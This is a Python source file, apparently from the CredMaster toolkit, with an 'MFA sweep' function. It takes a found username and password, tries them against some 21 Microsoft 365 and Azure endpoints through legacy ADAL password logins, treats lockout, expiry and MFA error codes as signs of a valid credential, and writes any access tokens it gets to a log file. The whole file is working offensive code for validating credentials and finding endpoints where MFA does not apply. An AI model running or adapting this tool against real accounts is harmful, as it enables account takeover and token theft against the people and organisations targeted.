from datetime import datetime
import adal #https://adal-python.readthedocs.io/en/latest/
import msal
import pprint
import utils.utils as utils
import utils.notify as notify


# MFA Sweep Functions
# MFA Sweep Code to pull token and check endpoints
def _input_scopes():
    return _select_options(
        [
            "https://graph.microsoft.com/.default",
            "https://management.azure.com/.default",
            "User.Read",
            "User.ReadBasic.All",
        ],
        header="Select a scope (multiple scopes can only be input by manually typing them, delimited by space):",
        accept_nonempty_string=True,
    ).split()


# ​
def acquire_token_by_username_password(app, username, password):
    """acquire_token_by_username_password() - See constraints here: https://docs.microsoft.com/en-us/azure/active-directory/develop/msal-authentication-flows#constraints-for-ropc"""
    pprint.pprint(
        app.acquire_token_by_username_password(
            username, password, scopes=_input_scopes(), app_name="My Signins"
        )
    )


_JWK1 = """{"kty":"RSA", "n":"2tNr73xwcj6lH7bqRZrFzgSLj7OeLfbn8216uOMDHuaZ6TEUBDN8Uz0ve8jAlKsP9CQFCSVoSNovdE-fs7c15MxEGHjDcNKLWonznximj8pDGZQjVdfK-7mG6P6z-lgVcLuYu5JcWU_PeEqIKg5llOaz-qeQ4LEDS4T1D2qWRGpAra4rJX1-kmrWmX_XIamq30C9EIO0gGuT4rc2hJBWQ-4-FnE1NXmy125wfT3NdotAJGq5lMIfhjfglDbJCwhc8Oe17ORjO3FsB5CLuBRpYmP7Nzn66lRY3Fe11Xz8AEBl3anKFSJcTvlMnFtu3EpD-eiaHfTgRBU7CztGQqVbiQ", "e":"AQAB"}"""
SSH_CERT_DATA = {"token_type": "ssh-cert", "key_id": "key1", "req_cnf": _JWK1}
SSH_CERT_SCOPE = ["https://pas.windows.net/CheckMyAccess/Linux/.default"]


# Check MFA credentials against various endpoints
def mfasweep(username, password, notify_obj):
    endpoint_table = [
        [1, "aad_graph_api", "https://graph.windows.net"],
        [2, "ms_graph_api", "https://graph.microsoft.com"],
        [3, "azure_mgmt_api", "https://management.azure.com"],
        [4, "windows_net_mgmt_api", "https://management.core.windows.net"],
        [5, "cloudwebappproxy", "https://proxy.cloudwebappproxy.net/registerapp"],
        [6, "officeapps", "https://officeapps.live.com"],
        [7, "outlook", "https://outlook.office365.com"],
        [8, "webshellsuite", "https://webshell.suite.office.com"],
        [9, "sara", "https://api.diagnostics.office.com"],
        [10, "office_mgmt", "https://manage.office.com"],
        [11, "msmamservice", "https://msmamservice.api.application"],
        [12, "spacesapi", "https://api.spaces.skype.com"],
        [13, "datacatalog", "https://datacatalog.azure.com"],
        [14, "database", "https://database.windows.net"],
        [15, "AzureKeyVault", "https://vault.azure.net"],
        [16, "onenote", "https://onenote.com"],
        [17, "o365_yammer", "https://api.yammer.com"],
        [18, "skype4business", "https://api.skypeforbusiness.com"],
        [19, "o365_exchange", "https://outlook-sdf.office.com"],
        [20, "aad_account", "https://account.activedirectory.windowsazure.com"],
        [21, "substrate", "https://substrate.office.com"],
    ]
    utils.prYellow(f"[!] Checking {username} and {password} against MFA Endpoints!")
    date_time = datetime.now()
    file_name = date_time.strftime("CredMaster_MFASweep" + "%m-%d-%y-%X.txt")
    file_name = file_name.replace(":", "-")

    token_list = []
    validation_log = open(file_name, "w+")
    print("Checking all endpoints with account: " + username + "\n")
    validation_log.write("Checking all endpoints with account: " + username + "\n\n")
    log_result = ""

    for entry in endpoint_table:
        endpoint = entry[2]
        error = ""
        result = ""
        token = None
        context = None
        context = adal.AuthenticationContext(
            "https://login.microsoftonline.com/common",
            api_version=None,
            proxies=None,
            verify_ssl=True,
        )
        try:
            # token = context.acquire_token_with_username_password(endpoint, username, password)
            token = context.acquire_token_with_username_password(
                endpoint, username, password, "1b730954-1685-4b74-9bfd-dac224a7b894"
            )
            if token is not None:
                result = utils.prGreen(
                    f"[+] Successful login on {endpoint} as {username} with password {password} (No MFA Needed!)"
                )
                log_result = "Successful login (Check output for a Token!)"
                error = "None"
                token_list.append(token)
        except adal.adal_error.AdalError as e:
            try:
                error_code = e.error_response["error_codes"][0]
                error_description = e.error_response["error_description"]
                tmp = error_description.split("\n")[0]
                if error_code == 50076:
                    result = utils.prYellow(
                        f"[*] Success: MFA Required on {endpoint} as {username} with password {password}"
                    )
                    log_result = "Success: MFA Required"
                    error = tmp
                elif error_code == 50158:
                    result = utils.prYellow(
                        f"[*] Probable Success: External security challenge not satisfied, likely a conditional access policy on {endpoint} as {username}"
                    )
                    log_result = "[*] Probable Success: External security challenge not satisfied, likely a conditional access policy"
                    error = tmp
                elif error_code == 50053:
                    result = utils.prGreen(
                        f"Success: Account Locked on {endpoint} as {username} with password {password}"
                    )
                    log_result = "Success: Account Locked"
                    error = tmp
                elif error_code == 50057:
                    result = utils.prYellow(
                        f"[!] Success: Account Disabled on {endpoint} as {username} with password {password}"
                    )
                    log_result = "Success: Account Disabled"
                    error = tmp
                elif error_code == 50055:
                    result = utils.prYellow(
                        f"[!] Success: Password Expired on {endpoint} as {username} with password {password}"
                    )
                    log_result = "Success: Password Expired"
                    error = tmp
                else:
                    result = utils.prRed(f"Failed to login on {endpoint} as {username}")
                    log_result = "Failed"
                    error = tmp
            except TypeError as f:
                result = str(e)
        print("Endpoint: " + endpoint)
        print(result + "\n")
        notify.notify_update(f"Endpoint: {endpoint}\n{result} with password {password}", notify_obj)
        validation_log.write(
            "Endpoint: "
            + endpoint
            + "\n\t"
            + "Result: "
            + log_result
            + "\n\tError Message: "
            + error
            + "\n\n"
        )
    for t in token_list:
        validation_log.write("Token: " + str(t) + "\n\n")
    print("Log of endpoint authorization attempts & Tokens printed written to: " + file_name + "\n")
    validation_log.close()